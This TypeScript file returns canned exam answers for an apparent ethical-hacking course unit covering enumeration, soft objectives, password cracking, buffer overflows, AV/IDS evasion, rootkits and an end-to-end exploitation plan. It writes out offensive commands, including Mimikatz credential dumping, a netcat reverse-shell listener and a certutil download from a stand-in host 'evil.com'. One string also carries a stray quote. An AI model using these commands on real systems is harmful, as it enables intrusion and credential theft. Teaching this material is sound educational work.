import { QuestionData, GeneratedAnswer } from "./types";

export function getAcsd53Unit4Answer(q: QuestionData): GeneratedAnswer | null {
  const { part, qNo } = q;

  // ==========================================
  // PART A (10 MARKS)
  // ==========================================
  if (part === "PART A") {
    switch (qNo) {
      case 1:
      case 4:
        return {
          summary: "Comprehensive corporate network enumeration strategy to systematically identify live hosts, open ports, OS types, service banners, and Active Directory shares.",
          keyPoints: [
            "Enumeration establishes active protocol connections to extract user accounts, group policies, shares, and services.",
            "Host & Port Discovery: Host discovery using ICMP/ARP sweeps, TCP SYN scanning (-sS), and service fingerprinting (-sV).",
            "SMB / NetBIOS (TCP 139/445): enum4linux, smbmap, null session query, RID cycling.",
            "SNMP (UDP 161): snmpwalk traversing MIB trees to dump interface routing and process tables.",
            "LDAP / Active Directory (TCP 389/636): ldapsearch and BloodHound mapping domain trusts and admin hierarchies."
          ],
          content: `## 1. Introduction: The Corporate Enumeration Strategy
**Enumeration** is the critical active reconnaissance phase wherein a penetration tester establishes direct, two-way protocol connections with target services to harvest granular, structured system inventory data—including user accounts, group memberships, network shares, routing tables, and running service banners.

\`\`\`
                         CORPORATE ENUMERATION LIFECYCLE
[Host & IP Discovery] ──► [Port & Service Fingerprinting] ──► [Deep Protocol Probing]
(ARP, ICMP, Nmap SYN)      (Service Banners, nmap -sV)        (SMB, SNMP, LDAP, RPC)
                                                                       │
                                                                       ▼
                                                       [Attack Surface Mapping]
                                                       (AD Paths, BloodHound Graph)
\`\`\`

---

## 2. In-Depth Protocol Enumeration Procedures

### 1. Host Discovery & Service Fingerprinting
- **High-Speed Network Sweep:** Scanning corporate CIDR allocations (\`10.0.0.0/8\`) using Nmap and Masscan:
  \`\`\`bash
  nmap -sS -sV -O -p- --min-rate 1000 10.10.0.0/16 -oA corp_internal_scan
  \`\`\`
- **Banner Grabbing:** Interrogating open listening ports to determine exact software daemon builds and patch revisions (e.g., Apache 2.4.49, OpenSSH 8.2p1).

### 2. SMB (Server Message Block) & NetBIOS Enumeration (TCP 139, 445)
- **Null Session Testing:** Exploiting legacy Windows systems that permit unauthenticated anonymous connections:
  \`\`\`bash
  smbclient -L //10.10.1.50 -N  # Lists open shares without credentials
  \`\`\`
- **RID Cycling:** Incrementally querying Relative Identifiers (RIDs 500, 501, 1000+) to brute-force extract the complete domain username list, discovering the built-in Administrator (RID 500) and service accounts.

### 3. SNMP (Simple Network Management Protocol) Enumeration (UDP 161)
- **Vulnerability:** SNMPv1 and SNMPv2c transmit credentials in unencrypted cleartext **Community Strings** (defaults: \`public\` for read-only; \`private\` for read-write).
- **Execution via \`snmpwalk\`:**
  \`\`\`bash
  snmpwalk -v 2c -c public 10.10.1.1 1.3.6.1.2.1.25.4.2.1.2  # Dumps all running processes!
  \`\`\`
- **Intelligence Yield:** Traverses the Management Information Base (MIB) tree to reveal interface IP addresses, open routing tables, hardware serial numbers, and running daemon processes.

### 4. LDAP & Active Directory Enumeration (TCP 389, 636)
- **Execution via \`BloodHound\` & \`ldapsearch\`:** Ingests Active Directory Access Control Lists (ACLs) to automatically graph attack paths leading to **Domain Admin** privileges.

---

## 3. Exam Summary
A corporate enumeration strategy systematically maps **hosts and services** via Nmap, extracts **user RIDs and shares** via SMB, audits **process tables and network routes** via SNMP, and maps **Active Directory permission paths** via LDAP and BloodHound.`
        };

      case 2:
      case 3:
        return {
          summary: "In-depth distinction between Soft Objectives and Direct Attacks during the enumeration and exploitation phases with concrete scenario analysis.",
          keyPoints: [
            "Soft Objectives focus on collecting auxiliary information, credentials, and low-privilege footholds without triggering alarms.",
            "Direct Attacks target critical high-value servers with aggressive exploitation payloads that risk detection or crashes.",
            "Soft Objectives: Unprotected internal wikis, secondary staging servers, cleartext configuration files, helpdesk impersonation.",
            "Direct Attacks: Direct buffer overflows against primary domain controllers, SQL injections on core financial ledgers."
          ],
          content: `## 1. Introduction: Strategic Attack Vectors
During the enumeration and initial exploitation phases, penetration testers face a tactical decision: whether to launch **Direct Attacks** against primary production systems, or to pursue **Soft Objectives** that yield intermediate footholds with minimal detection risk.

\`\`\`
                                  ATTACK STRATEGIES
        ┌───────────────────────────────────┴───────────────────────────────────┐
        ▼                                                                       ▼
SOFT OBJECTIVES (Low Profile / High Yield)                  DIRECT ATTACKS (High Profile / High Risk)
- Target: Secondary, unmonitored systems                    - Target: Primary Production Domain Controller
- Vector: Intranet wikis, dev servers, backups              - Vector: Remote Code Execution, Buffer Overflows
- Detection Risk: Extremely Low                             - Detection Risk: Extremely High (Triggers SIEM)
- Result: Discovers admin credentials silently              - Result: High probability of service crash
\`\`\`

---

## 2. In-Depth Operational Breakdown

### 1. Soft Objectives (Indirect / Low-Profile Targets)
- **Definition:** Non-critical or secondary assets, documentation stores, staging environments, or human communication channels that are loosely monitored and weakly defended.
- **Examples:**
  - *Internal IT Documentation Wikis (Confluence):* Searching for pages titled *"VPN Setup"*, *"DB Passwords"*, or *"Network Topology"*.
  - *Secondary Staging Servers (\`dev-api.internal\`):* Development servers often have debugging enabled and contain hardcoded API keys.
  - *Accessible Network Shares (\`\\\\NAS\\Shared\\Backups\`):* Unprotected network shares containing unencrypted \`.vhd\` virtual machine disks or configuration backups.
- **Strategic Value:** Allows an attacker to quietly harvest high-privileged credentials without firing a single defensive alarm in the corporate Security Operations Center (SOC).

### 2. Direct Attacks (Hard Targets)
- **Definition:** Immediate, aggressive attacks launched directly against the organization's primary production assets (e.g., the primary Active Directory Domain Controller, the core database server, or the main authentication firewall).
- **Techniques:** Exploiting memory corruption vulnerabilities (Buffer Overflows), running volumetric password spraying, or executing zero-day exploits.
- **Risks:**
  - **Service Interruption:** High probability of crashing production databases.
  - **Immediate Detection:** Instantly flagged by intrusion detection systems (IDS) and Endpoint Detection and Response (EDR) agents.

---

## 3. Comparison Matrix

| Dimension | Soft Objectives | Direct Attacks |
| :--- | :--- | :--- |
| **Primary Target** | Secondary servers, wikis, backups | Core Domain Controller, production DB |
| **Defensive Monitoring**| Minimal / Ignored | Monitored 24/7 by SOC / SIEM |
| **Exploit Complexity** | Low (Misconfigurations / Credentials) | High (Memory corruption, zero-days) |
| **Risk of Outage** | Zero / Minimal | High (Kernel panics, database locks) |
| **Adversary Mindset** | Professional APT / Skilled Pen Tester | Script Kiddie / Noisy Attacker |

---

## 4. Exam Summary
**Soft Objectives** target weakly defended auxiliary assets (internal wikis, dev staging, backup shares) to harvest credentials quietly; **Direct Attacks** target primary production servers directly with aggressive exploits, carrying severe risks of detection and service downtime.`
        };

      case 5:
        return {
          summary: "Comparative evaluation of enumeration techniques between Windows and Linux operating systems, covering user accounts, shares, services, and authentication databases.",
          keyPoints: [
            "Windows enumeration centers on Active Directory, SMB/RPC (ports 139/445), SAM database, and LSASS memory.",
            "Linux enumeration centers on SSH, NFS exports, /etc/passwd, /etc/shadow, and SUID binaries.",
            "Windows tools: enum4linux, Mimikatz, BloodHound, PowerView.",
            "Linux tools: LinPEAS, LinEnum, showmount, id, sudo -l."
          ],
          content: `## 1. Operating System Enumeration Architectures
Operating systems structure identity, permissions, and network access under fundamentally different architectures. A penetration tester must apply specialized OS-aware enumeration methodologies.

\`\`\`
WINDOWS ENUMERATION:                        LINUX ENUMERATION:
Active Directory, Kerberos, SMB (445)        POSIX Permissions, SSH (22), NFS (2049)
Security Account Manager (SAM)               /etc/passwd and /etc/shadow
LSASS Process Memory (Mimikatz)              SUID/SGID Binaries, Sudoers (LinPEAS)
\`\`\`

---

## 2. In-Depth Technical Contrast

### 1. Windows Operating System Enumeration
- **Network Probing:** Probing SMB (445), RPC Endpoint Mapper (135), and NetBIOS (139).
- **Domain vs. Local Accounts:**
  - Local accounts stored in the encrypted **SAM (Security Account Manager)** database file: \`C:\\Windows\\System32\\config\\SAM\`.
  - Domain accounts managed centrally via **Active Directory NTDS.dit** database.
- **Credential Harvesting in Memory:** The **LSASS (Local Security Authority Subsystem Service)** process memory stores decrypted cleartext passwords and NTLM hashes; extractable via **Mimikatz** (\`sekurlsa::logonpasswords\`).
- **Unquoted Service Paths:** Auditing service binary paths with spaces missing quotation marks (\`C:\\Program Files\\My App\\service.exe\`) allowing local privilege escalation.

### 2. Linux Operating System Enumeration
- **User and Identity Enumeration:**
  - Reading the publicly readable \`/etc/passwd\` file to enumerate all usernames and user IDs ($UID = 0$ is root).
  - Checking password hashes in \`/etc/shadow\` (requires root read permissions; uses SHA-512 \`$6$\` crypt hashes).
- **Network Shares (NFS):**
  - Enumerating network file system exports using \`showmount -e <target_IP>\`. Misconfigured shares with \`no_root_squash\` permit instant root compromise.
- **SUID Binary Audit:** Searching for binaries executing with root permissions:
  \`\`\`bash
  find / -perm -u=s -type f 2>/dev/null
  \`\`\`

---

## 3. Comparison Matrix

| Dimension | Windows Enumeration | Linux Enumeration |
| :--- | :--- | :--- |
| **Authentication Protocol**| NTLMv2 & Kerberos | PAM, Shadow Passwords, SSH Keys |
| **Key Registry / Config** | Windows Registry (\`HKLM\\SAM\`, \`HKLM\\SYSTEM\`) | \`/etc/passwd\`, \`/etc/shadow\`, \`/etc/sudoers\` |
| **Network Protocol** | SMB (TCP 445), RPC (TCP 135) | SSH (TCP 22), NFS (TCP 2049) |
| **Automated Tool** | WinPEAS, BloodHound, PowerView | LinPEAS, LinEnum, Chkrootkit |

---

## 4. Exam Summary
**Windows enumeration** targets SMB, Active Directory, SAM registries, and LSASS memory; **Linux enumeration** targets \`/etc/passwd\`, NFS shares, SUID binaries, and sudo privileges.`
        };

      case 6:
        return {
          summary: "Comprehensive technical analysis of Password Auditing and Cracking methodologies: Dictionary Attacks, Brute-Force, Hybrid, and Rainbow Tables using John the Ripper and Hashcat.",
          keyPoints: [
            "Password auditing evaluates the strength of corporate hashes extracted from SAM or /etc/shadow.",
            "Dictionary Attacks test pre-compiled wordlists (RockYou); Hybrid attacks append numbers and symbols.",
            "Brute-Force exhaustively tests every combination of characters; guaranteed success given infinite time.",
            "Rainbow Tables use precomputed hash chains and reduction functions to achieve instant cracking of unsalted hashes."
          ],
          content: `## 1. Introduction: Password Hash Auditing
When an ethical hacker extracts password hashes from a compromised Windows Domain Controller (NTDS.dit) or Linux server (\`/etc/shadow\`), the hashes must be audited to identify weak passwords violating corporate policy.

\`\`\`
                               PASSWORD CRACKING PARADIGMS
        ┌───────────────────────────────────┼───────────────────────────────────┐
        ▼                                   ▼                                   ▼
Dictionary Attack                   Hybrid / Rule-Based                 Rainbow Tables
(Tests precompiled wordlists)       (Appends permutations, leetspeak:   (Precomputed time-memory trade-off;
e.g., RockYou.txt                   "P@ssword123!")                      instant lookup for unsalted hashes)
\`\`\`

---

## 2. In-Depth Cracking Methodologies

### 1. Dictionary Attacks
- **Mechanism:** Hashes every word in a large pre-compiled list of known passwords (e.g., **RockYou.txt**, containing 14.3 million breached passwords) and compares the resulting digest against target hashes.
- **Speed:** Extremely fast; cracks 40%–60% of typical corporate passwords in minutes.

### 2. Brute-Force Attacks (Exhaustive Search)
- **Mechanism:** Mathematically generates and tests every possible permutation of characters from a defined keyspace ($A-Z, a-z, 0-9, !@#\\\$%$) of length $L$:
  $$\\text{Total Permutations} = |\\Sigma|^L$$
- **Complexity:** For an 8-character password with 95 printable ASCII characters:
  $$95^8 \\approx 6.63 \\times 10^{15} \\text{ combinations}$$
  Guaranteed to succeed, but computationally infeasible for long, complex passwords.

### 3. Rule-Based and Hybrid Attacks
- **Mechanism:** Takes dictionary base words and applies heuristic transformation rules mimicking human behavior:
  - *Capitalization:* Capitalizes the first letter.
  - *Leetspeak Substitution:* \`e -> 3\`, \`a -> @\`, \`o -> 0\`, \`s -> \$\`.
  - *Year Appending:* Appends current or recent years (\`2023!\`, \`2024#\`).
- **Tool:** **Hashcat** with \`best64.rule\` or \`OneRuleToRuleThemAll\`.

### 4. Rainbow Tables (Precomputed Hash Chains)
- **Mechanism:** A time-memory trade-off table created by computing millions of **Hash Chains** using alternating cryptographic hash functions $H(P)$ and reduction functions $R(H)$:
  $$P_0 \\xrightarrow{H} H_0 \\xrightarrow{R_1} P_1 \\xrightarrow{H} H_1 \\xrightarrow{R_2} P_2 \\dots \\xrightarrow{H} H_k$$
  Only the starting plaintext $P_0$ and end-hash $H_k$ are stored on disk.
- **The Salt Defense:** Rainbow tables are **rendered completely useless by Cryptographic Salting**. A unique random salt appended to each password changes the resulting hash, requiring the attacker to recompute a multi-terabyte rainbow table for every individual user!

---

## 3. Comparison of Primary Cracking Tools

| Feature | John the Ripper (JtR) | Hashcat |
| :--- | :--- | :--- |
| **Primary Architecture** | Optimized for CPU (Multi-core) | Highly optimized for GPU (CUDA / OpenCL) |
| **Hash Types** | Unix crypt, NTLM, Kerberos, Archives | Hundreds of raw cryptographic hashes |
| **Throughput (NTLM)** | Millions of hashes/second | **Billions** of hashes/second on modern GPUs |

---

## 4. Exam Summary
Password auditing tests hashes using **Dictionary Attacks** (wordlists), **Hybrid/Rule-Based Attacks** (human transformation patterns), **Brute-Force** (exhaustive search), and **Rainbow Tables** (precomputed hash chains, defeated by **salting**).`
        };

      case 7:
        return {
          summary: "Demonstration of vulnerable service exploitation: buffer overflows, weaponization, payload delivery, and documentation.",
          keyPoints: [
            "Exploitation weaponizes an identified vulnerability to gain initial execution foothold.",
            "Stack-based buffer overflow overwrites EIP with return address pointing to NOP sled + shellcode.",
            "Documenting attack methodology requires precise PoC commands, memory layout offsets, and mitigation steps."
          ],
          content: `## 1. Vulnerability Exploitation Methodology
Exploiting a vulnerable service translates theoretical risk into practical proof-of-compromise. In an ethical hacking engagement, exploitation must be controlled, repeatable, and fully documented.

---

## 2. Technical Anatomy of Exploitation (Stack Buffer Overflow)

\`\`\`
1. Fuzzing: Send increasing buffer sizes until target process crashes (EIP overwritten).
2. Offset Identification: Cyclic pattern identifies exact offset to EIP (e.g., 112 bytes).
3. Bad Character Analysis: Identify bad chars (\x00, \x0a) that truncate the buffer.
4. JMP ESP Pointer: Find static executable instruction in memory: JMP ESP (0x77e12345).
5. Weaponization: [Padding x 112] + [JMP ESP address] + [NOP Sled \x90 x 32] + [Reverse Shellcode].
\`\`\`

---

## 3. Post-Exploitation Foothold Documentation
- Document the exact netcat reverse shell command:
  \`\`\`bash
  nc -lvnp 4444  # Receiving reverse shell on listener
  \`\`\`
- Provide exact remediation: Replace unsafe C functions (\`strcpy\`) with bounded alternatives (\`strncpy\`, \`strlcpy\`) and enable compiler defenses (**DEP/NX**, **ASLR**, **Stack Canaries**).

---

## 4. Exam Summary
Exploiting a vulnerable service involves finding the memory offset, locating an executable **JMP ESP** gadget, injecting a **NOP sled with shellcode**, and documenting step-by-step reproduction and patching guidance.`
        };

      case 8:
        return {
          summary: "Comprehensive technical analysis of Evasion Techniques: bypassing Antivirus (AV) and Intrusion Detection Systems (IDS/IPS) via encryption, packing, and LOLBins.",
          keyPoints: [
            "Signature-based AV checks static byte hashes; heuristic AV checks behavior and API calls.",
            "Evasion methods: Polymorphic shellcode, custom crypters, packers (UPX), and process injection.",
            "Living-off-the-Land Binaries (LOLBins): Using trusted OS binaries (PowerShell, certutil, rundll32) to execute payloads.",
            "IDS Evasion: Packet fragmentation, timing delays, and encrypted C2 channels."
          ],
          content: `## 1. Introduction: The Defensive Evasion Imperative
Modern networks deploy layered detection mechanisms: **Intrusion Detection Systems (IDS/IPS)** inspecting network packets, and **Antivirus (AV) / Endpoint Detection & Response (EDR)** monitoring memory and disk execution. Ethical testers test whether defenses can be bypassed.

---

## 2. In-Depth Evasion Techniques

\`\`\`
                               DEFENSIVE EVASION TAXONOMY
        ┌───────────────────────────────────┼───────────────────────────────────┐
        ▼                                   ▼                                   ▼
Antivirus (AV) Evasion              EDR Memory Bypassing                Network IDS Evasion
- Custom Crypters & Encoders        - Process Hollowing                 - Packet Fragmentation
- Polymorphic / Metamorphic Code    - Direct System Calls (Syscalls)    - Out-of-Order TCP Segments
- Living-off-the-Land (LOLBins)     - Unhooking ntdll.dll in RAM        - Encrypted C2 over HTTPS / DNS
\`\`\`

### 1. Antivirus (AV) Bypassing (Disk & File Evasion)
- **Crypters and Obfuscation:** Standard payloads generated by tools like Metasploit (\`msfvenom\`) are instantly blocked because AV vendors have cataloged their static byte signatures. Custom crypters encrypt the shellcode using AES/XOR and decrypt it directly in RAM upon runtime execution.
- **Living-off-the-Land Binaries (LOLBins):** Attackers avoid dropping executable \`.exe\` binaries to disk; instead, they abuse built-in, digitally signed Microsoft operating system tools:
  - \`certutil.exe -urlcache -split -f http://evil.com/payload.txt\`: Downloads files without triggering web filter alarms.
  - \`rundll32.exe\`, \`regsvr32.exe\`: Executes code directly from memory.

### 2. Network IDS/IPS Evasion
- **TCP Packet Fragmentation:** Splitting malicious exploit payloads across tiny IP fragments (e.g., 8 bytes each) to bypass simple string-matching IDS rules that fail to perform full TCP session stream reassembly.
- **Timing and Jitter Modulation:** Inserting randomized delays between port probes (\`nmap -T1\` sneaky mode) to evade threshold-based rate alarms.

---

## 3. Exam Summary
Defensive evasion bypasses security controls through **crypters and in-memory execution** (defeating static AV), **LOLBins** (abusing trusted tools like certutil), and **packet fragmentation / timing delays** (defeating network IDS).`
        };

      case 9:
        return {
          summary: "Technical evaluation of Rootkits, kernel-level persistence, and network services on long-term system compromise.",
          keyPoints: [
            "Rootkits are stealthy malicious software designed to maintain hidden, privileged access to a system.",
            "User-Mode Rootkits (Ring 3) hook API calls; Kernel-Mode Rootkits (Ring 0) hook system call tables and modify kernel memory.",
            "Rootkits conceal processes, files, network sockets, and user accounts from administrative diagnostic tools.",
            "Detection requires specialized memory analysis (Volatility) and boot-level integrity verification."
          ],
          content: `## 1. Definition and Role of Rootkits
A **Rootkit** is a collection of sophisticated software tools designed to maintain persistent, undetected administrative (**root** or **SYSTEM**) access to a compromised computer while actively hiding its presence from system administrators, the operating system kernel, and security tools.

\`\`\`
Ring 3 (User Space):    [ Task Manager / 'ps' ] ◄── (Deceived by Hooked APIs)
                               │
                               ▼ System Calls (ZwQuerySystemInformation)
Ring 0 (Kernel Space):  [ ROOTKIT HOOK ] ──► Hides Attacker Process PID from List
                               │
                               ▼
                        [ OS Kernel Core ]
\`\`\`

---

## 2. In-Depth Rootkit Taxonomy

### 1. User-Mode Rootkits (Ring 3)
- **Mechanism:** Operates in application space by injecting DLLs or hooking user-mode API libraries (e.g., modifying \`ntdll.dll\` or intercepting the C standard library \`libc\`).
- **Example:** Intercepts directory listing functions (\`readdir()\`) to omit any files beginning with a specific hidden prefix (e.g., \`.backdoor_\`).
- **Detection:** Relatively easy to detect by comparing user-space tool outputs with raw low-level disk sector reads.

### 2. Kernel-Mode Rootkits (Ring 0)
- **Mechanism:** Installs as a device driver directly inside the operating system kernel, possessing the highest possible hardware privilege level.
- **Techniques:**
  - **System Call Table Hooking:** Modifies the System Service Descriptor Table (SSDT) in Windows or \`sys_call_table\` in Linux to redirect kernel execution.
  - **Direct Kernel Object Manipulation (DKOM):** Directly unlinks the malicious process's \`EPROCESS\` block from the active process linked list in kernel memory. The process continues executing on the CPU, but disappears completely from Task Manager and \`ps\`.

### 3. Firmware & Bootkits (Ring -1 / UEFI)
- Installs in the computer's Master Boot Record (MBR) or UEFI motherboard firmware, achieving persistence that survives complete hard-drive formatting and OS reinstallation.

---

## 3. Exam Summary
**Rootkits** maintain persistent, hidden administrative access: **User-mode (Ring 3)** hooks API libraries, while **Kernel-mode (Ring 0)** hooks system calls and modifies kernel memory (DKOM) to hide processes and sockets from detection.`
        };

      case 10:
        return {
          summary: "Comprehensive design of an End-to-End Exploitation Plan incorporating enumeration, vulnerability identification, exploitation, privilege escalation, and post-exploitation persistence.",
          keyPoints: [
            "End-to-End exploitation plan transitions systematically across all adversary attack phases.",
            "Stage 1: Enumeration (Active probing of target surface).",
            "Stage 2: Vulnerability Identification (Correlating CVEs).",
            "Stage 3: Weaponization & Exploitation (Initial non-destructive foothold).",
            "Stage 4: Privilege Escalation & Lateral Movement (BloodHound AD paths).",
            "Stage 5: Post-Exploitation & Clean-Up (Removing artifacts, verifying client security)."
          ],
          content: `## 1. Introduction: The Integrated Exploitation Architecture
An end-to-end exploitation plan is a structured engineering blueprint that traces the complete attack lifecycle—from initial reconnaissance and enumeration to achieving administrative domain compromise, followed by ethical cleanup.

\`\`\`
[1. Enumeration] ──► [2. Vulnerability Discovery] ──► [3. Initial Foothold]
(Nmap, SMB, RPC)      (CVE-2021-44228, SQLi)            (Unprivileged Shell: www-data)
                                                               │
                                                               ▼
[6. Ethical Clean-Up] ◄── [5. Lateral Movement]   ◄── [4. Privilege Escalation]
(Purge PoC files)          (Pass-the-Hash, AD)          (SUID, Mimikatz, Kernel Exploit)
\`\`\`

---

## 2. The Five Sequential Execution Stages

### Stage 1: Active Enumeration
- Scan IP block \`10.10.10.0/24\` to discover open web applications, SMB shares, and database endpoints.

### Stage 2: Vulnerability Identification & Threat Modeling
- Discover an unauthenticated Apache Tomcat manager interface running with default administrative credentials (\`tomcat:s3cret\`).

### Stage 3: Initial Foothold (Controlled Exploitation)
- Deploy a non-destructive WAR file payload to establish a reverse TCP Meterpreter shell executing with low privileges (\`tomcat\` user).

### Stage 4: Privilege Escalation
- Execute enumeration script (\`WinPEAS\` / \`LinPEAS\`).
- Discover a misconfigured scheduled task (cron job) running with \`root\` permissions pointing to a world-writable script: \`/usr/local/bin/backup.sh\`.
- Append a reverse shell command to \`backup.sh\`, elevating permissions to **root**.

### Stage 5: Lateral Movement & Post-Exploitation Proof
- Dump password hashes from \`/etc/shadow\`.
- Use compromised SSH keys to pivot across the internal management network, demonstrating the ability to access the core financial ledger database.

### Stage 6: Post-Engagement Clean-Up
- Remove all created temporary user accounts, delete test scripts, kill persistent shell listeners, and document exact timestamps for forensic log verification.

---

## 3. Exam Summary
An end-to-end exploitation plan transitions from **enumeration** to **vulnerability identification**, **initial exploitation** (foothold), **privilege escalation** (root/admin), **lateral movement** (pivoting), and **ethical post-engagement cleanup**.'`
        };
    }
  }

  // ==========================================
  // PART B (10 MARKS)
  // ==========================================
  if (part === "PART B") {
    switch (qNo) {
      case 1:
        return {
          summary: "Comprehensive conceptual explanation of Enumeration in penetration testing engagements.",
          keyPoints: [
            "Active reconnaissance stage establishing two-way protocol handshakes.",
            "Extracts precise operational details: user accounts, group policies, shares, and service banners.",
            "Bridges scanning and exploitation by identifying exact attack targets."
          ],
          content: `## 1. What is Enumeration?
In penetration testing, **Enumeration** is the active phase of information gathering where a security tester directly queries target services and protocols to extract detailed, structured lists of system resources, user accounts, and configuration metadata.

---

## 2. Core Objectives of Enumeration
1. **User Account Discovery:** Identifying valid usernames to prepare for password spraying or targeted credential attacks.
2. **Network Share Enumeration:** Locating accessible Windows SMB or Linux NFS shares containing sensitive files or backups.
3. **Application & Banner Identification:** Querying running daemons to discover exact version strings and patch levels.
4. **Active Directory Mapping:** Harvesting domain groups, trusts, and administrative relationships.`
        };

      case 2:
        return {
          summary: "Survey of primary enumeration techniques across SMB, SNMP, LDAP, DNS, and NetBIOS with concrete tool examples.",
          keyPoints: [
            "SMB Enumeration: enum4linux, smbmap, crackmapexec.",
            "SNMP Enumeration: snmpwalk, onesixtyone traversing MIB trees.",
            "LDAP Enumeration: ldapsearch, BloodHound.",
            "DNS Enumeration: dig, dnsrecon, zone transfers."
          ],
          content: `## 1. Major Enumeration Techniques

### 1. SMB / NetBIOS Enumeration (TCP 139, 445)
- **Tools:** \`enum4linux\`, \`smbmap\`
- Queries Windows workstations and domain controllers to extract usernames, domain policies, and list share permissions (\`READ/WRITE\`).

### 2. SNMP Enumeration (UDP 161)
- **Tools:** \`snmpwalk\`, \`snmp-check\`
- Uses cleartext community strings (\`public\`) to dump device routing tables, interface IPs, and running process lists from routers and switches.

### 3. LDAP Enumeration (TCP 389)
- **Tools:** \`ldapsearch\`, \`BloodHound\`
- Queries Active Directory domain controllers to harvest all domain users, computer accounts, and group memberships.

### 4. DNS Enumeration
- **Tools:** \`dig\`, \`dnsrecon\`
- Attempts automated DNS Zone Transfers (AXFR) and performs subdomain brute-forcing.`
        };

      case 3:
        return {
          summary: "In-depth explanation of Soft Objectives in enumeration and exploitation.",
          keyPoints: [
            "Low-profile secondary targets with weak monitoring.",
            "Includes internal wikis, dev staging environments, and backup network shares.",
            "Allows attackers to harvest credentials quietly without alerting security teams."
          ],
          content: `## 1. Understanding Soft Objectives
In penetration testing, a **Soft Objective** refers to an auxiliary, weakly defended, or loosely monitored asset targeted by testers to harvest operational intelligence and credentials quietly, avoiding detection by primary defense systems.

### Typical Soft Objectives:
1. **Internal Documentation (Confluence/SharePoint):** Searching for passwords, VPN guides, and network topology diagrams.
2. **Development / Staging Servers:** Unmonitored staging web servers with debugging enabled and hardcoded database API tokens.
3. **Unprotected Backup Shares:** Network shares containing unencrypted system backups (\`.bak\`, \`.vmdk\`).`
        };
    }
  }

  // ==========================================
  // PART C (2 MARKS)
  // ==========================================
  if (part === "PART C") {
    switch (qNo) {
      case 1:
        return {
          summary: "Formal definition of Enumeration in ethical hacking.",
          keyPoints: [
            "Active protocol probing phase.",
            "Extracts user lists, network shares, routing tables, and software banners."
          ],
          content: `### Definition of Enumeration
**Enumeration** is the active phase of penetration testing where an ethical hacker establishes direct protocol connections with target services (such as SMB, SNMP, LDAP, or RPC) to extract specific, structured system inventory information, including user accounts, group policies, network shares, and banner versions.`
        };

      case 2:
        return {
          summary: "Formal definition of a Soft Objective in penetration testing.",
          keyPoints: [
            "Low-profile secondary target providing credentials with minimal detection risk.",
            "Includes internal wikis, staging servers, and backup shares."
          ],
          content: `### What is a Soft Objective?
In penetration testing, a **Soft Objective** is a secondary, low-profile, or weakly defended asset (such as an internal IT documentation wiki, staging server, or unmonitored file share) targeted by testers to harvest credentials and operational intelligence quietly without triggering alarms on core production systems.`
        };

      case 3:
        return {
          summary: "Formal definition of Exploitation in cybersecurity.",
          keyPoints: [
            "Weaponizing a vulnerability to achieve unauthorized access or code execution.",
            "Translates potential flaws into demonstrated business compromise."
          ],
          content: `### Definition of Exploitation
**Exploitation** is the active execution of specialized code, payload commands, or configuration manipulation (**an exploit**) against an identified security vulnerability to breach security controls, gain unauthorized system access, escalate privileges, or exfiltrate protected data.`
        };

      case 4:
        return {
          summary: "Formal definition of a Buffer Overflow.",
          keyPoints: [
            "Writing data beyond buffer boundaries in memory.",
            "Overwrites return instruction pointers (EIP) to hijack CPU execution."
          ],
          content: `### Definition of Buffer Overflow
A **Buffer Overflow** is a memory corruption flaw that occurs when a program writes more data to a bounded memory buffer than it was allocated to hold. The adjacent memory is overwritten, allowing an attacker to overwrite the **Instruction Pointer (EIP)** and hijack CPU control flow.`
        };

      case 5:
        return {
          summary: "Formal definition of Privilege Escalation.",
          keyPoints: [
            "Elevating access privileges from unprivileged to administrative.",
            "Categorized into Horizontal and Vertical privilege escalation."
          ],
          content: `### Definition of Privilege Escalation
**Privilege Escalation** is the post-exploitation technique of exploiting system bugs, misconfigurations, or credential re-use to gain higher-tier permissions than originally assigned:
- **Vertical Escalation:** Gaining higher authority (e.g., standard user elevating to \`root\` or \`Domain Admin\`).
- **Horizontal Escalation:** Accessing the data/accounts of peers at the same privilege tier.`
        };
    }
  }

  return null;
}
